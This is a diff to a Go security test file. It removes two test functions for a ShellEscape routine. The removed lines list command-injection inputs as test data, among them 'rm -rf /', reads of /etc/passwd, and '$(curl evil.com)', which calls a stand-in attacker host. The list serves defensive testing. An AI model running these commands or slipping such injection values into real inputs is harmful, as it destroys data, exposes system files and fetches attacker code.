@@ -1,84 +1,8 @@
 package security
 
 import (
-	"strings"
 	"testing"
 )
-
-func TestShellEscape(t *testing.T) {
-	tests := []struct {
-		name     string
-		input    string
-		contains string // What the escaped output should contain
-	}{
-		{
-			name:     "simple string",
-			input:    "hello",
-			contains: "hello",
-		},
-		{
-			name:     "string with spaces",
-			input:    "hello world",
-			contains: "hello world",
-		},
-		{
-			name:     "command injection semicolon",
-			input:    "; rm -rf /",
-			contains: "; rm -rf /",
-		},
-		{
-			name:     "command substitution dollar",
-			input:    "$(whoami)",
-			contains: "$(whoami)",
-		},
-		{
-			name:     "command substitution backtick",
-			input:    "`whoami`",
-			contains: "`whoami`",
-		},
-		{
-			name:     "variable expansion",
-			input:    "${IFS}malicious",
-			contains: "${IFS}malicious",
-		},
-		{
-			name:     "newline injection",
-			input:    "test\nmalicious",
-			contains: "test",
-		},
-		{
-			name:     "pipe injection",
-			input:    "test | malicious",
-			contains: "test | malicious",
-		},
-		{
-			name:     "background execution",
-			input:    "test & malicious",
-			contains: "test & malicious",
-		},
-		{
-			name:     "redirect injection",
-			input:    "test > /etc/passwd",
-			contains: "test > /etc/passwd",
-		},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			escaped := ShellEscape(tt.input)
-
-			// Ensure the escaped string is quoted
-			if !strings.HasPrefix(escaped, "\"") || !strings.HasSuffix(escaped, "\"") {
-				t.Errorf("ShellEscape() = %v, expected quoted string", escaped)
-			}
-
-			// Ensure dangerous characters are escaped
-			if strings.Contains(tt.input, "\n") && !strings.Contains(escaped, "\\n") {
-				t.Errorf("ShellEscape() did not escape newline properly: %v", escaped)
-			}
-		})
-	}
-}
 
 func TestValidateUsername(t *testing.T) {
 	tests := []struct {
@@ -307,48 +231,6 @@ func TestValidateCommand(t *testing.T) {
 			err := ValidateCommand(tt.cmd)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
-			}
-		})
-	}
-}
-
-// Fuzzing-style test with many attack patterns
-func TestShellEscapeAttackPatterns(t *testing.T) {
-	attackPatterns := []string{
-		"; rm -rf /",
-		"$(whoami)",
-		"`whoami`",
-		"../../etc/passwd",
-		"${IFS}malicious",
-		"\nmalicious",
-		"| cat /etc/passwd",
-		"& malicious &",
-		"> /dev/null",
-		"< /etc/passwd",
-		"|| malicious",
-		"&& malicious",
-		"test\nrm -rf /",
-		"test;malicious",
-		"$(curl evil.com)",
-		"`curl evil.com`",
-		"test${IFS}command",
-		"a'b\"c",
-		"test\x00null",
-	}
-
-	for _, pattern := range attackPatterns {
-		t.Run(pattern, func(t *testing.T) {
-			escaped := ShellEscape(pattern)
-
-			// The escaped string should be quoted
-			if !strings.HasPrefix(escaped, "\"") {
-				t.Errorf("ShellEscape() did not quote attack pattern: %s -> %s", pattern, escaped)
-			}
-
-			// The escaped string should not execute the malicious pattern
-			// This is a smoke test - actual shell execution testing would be in integration tests
-			if !strings.Contains(escaped, "\\") && (strings.Contains(pattern, "\n") || strings.Contains(pattern, "$")) {
-				t.Logf("Warning: Attack pattern may not be fully escaped: %s -> %s", pattern, escaped)
 			}
 		})
 	}
